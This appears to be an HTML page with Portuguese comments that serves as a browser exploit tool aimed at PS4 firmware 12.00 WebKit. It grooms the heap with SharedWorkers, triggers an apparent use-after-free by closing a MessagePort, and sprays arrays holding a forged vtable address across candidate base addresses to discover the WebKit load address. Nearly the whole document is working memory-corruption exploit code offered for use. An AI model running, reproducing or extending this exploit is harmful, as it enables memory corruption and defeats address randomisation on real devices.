<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 VTABLE ORACLE V2</title>
</head>
<body>

    <h1>VTABLE ORACLE V2 (Precision Target)</h1>
    <h3>VTable Offset: 0x82FBF8 | Target Size: 0xA0</h3>
    <p>Selecione uma base. Se o console NÃO desligar, é a correta.</p>
    
    <div id="buttons"></div>
    <div id="log">Pronto.</div>

    <script>
        function log(msg, cls="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // DADOS CONFIRMADOS DO BINÁRIO
        // =================================================================
        // Candidato mais forte do seu scan:
        const VTABLE_OFFSET = 0x82FBF8n; 
        
        // Tamanho mais provável (baseado em heurística anterior)
        const TARGET_SIZE = 0xA0;       

        // Bases para testar
        const BASES = [
            "0x800000000", "0x800004000", "0x801000000",
            "0x800400000", "0x800800000", 
            "0x820000000", "0x820004000", "0x820010000",
            "0x880000000", "0x880004000",
            "0x900000000", "0x920000000",
            "0x200000000"
        ];

        // =================================================================
        // PAYLOAD: RESTAURAR VTABLE
        // =================================================================
        function build_repair_payload(baseStr) {
            const base = BigInt(baseStr);
            const vtable_real = base + VTABLE_OFFSET;
            
            // Converte endereço para float
            const buf = new ArrayBuffer(8);
            const view = new DataView(buf);
            view.setBigUint64(0, vtable_real, true);
            const vtable_as_double = view.getFloat64(0, true);

            // Tamanho 0xA0 (160 bytes)
            // 160 - 16 (header) = 144 bytes dados
            // 144 / 8 = 18 elementos
            const arr = new Array(18);
            
            // Encher o objeto com o endereço da VTable VÁLIDA
            for(let i=0; i<arr.length; i++) {
                arr[i] = vtable_as_double;
            }
            return arr;
        }

        // =================================================================
        // EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function test_base(base) {
            log(`>>> TESTANDO BASE: ${base} <<<`);
            
            var payload = build_repair_payload(base);

            // 1. GROOMING (380)
            for(let i=0; i<380; i++) {
                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 2. TRIGGER (403)
            var count = 0;
            var limit = 403 - 380;
            
            var it = setInterval(() => {
                if(count >= limit) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO !!!");
                    var v = workers_stash.pop();
                    var p = v.port;
                    v.port.close();
                    
                    // SPRAY
                    var spray = [];
                    for(let k=0; k<25000; k++) {
                        spray.push(payload.slice(0));
                    }

                    // CHECK DE SOBREVIVÊNCIA
                    setTimeout(() => {
                        try {
                            var s = p.toString();
                            
                            log("RESULTADO: " + s, "success");
                            
                            if (s.indexOf("MessagePort") !== -1) {
                                log("O objeto sobreviveu mas não foi substituído (Spray falhou).");
                            } else {
                                log("!!! OBJETO SUBSTITUÍDO E VIVO !!!", "success");
                                log(`BASE ${base} É A CORRETA!`, "success");
                                alert(`BINGO! Base WebKit: ${base}`);
                            }
                        } catch(e) {
                            log("Erro JS (Isso é bom, não deu Panic): " + e);
                        }
                        
                        // Limpeza
                        workers_stash.forEach(w=>{try{w.port.close()}catch(e){}});
                        workers_stash = [];
                    }, 1000);

                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+count);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
                count++;
            }, 100);
        }

        // UI Setup
        var div = document.getElementById("buttons");
        BASES.forEach(base => {
            var b = document.createElement("button");
            b.innerText = base;
            b.onclick = function() {
                this.classList.add("tried");
                test_base(base);
            };
            div.appendChild(b);
        });
    </script>
</body>
</html>
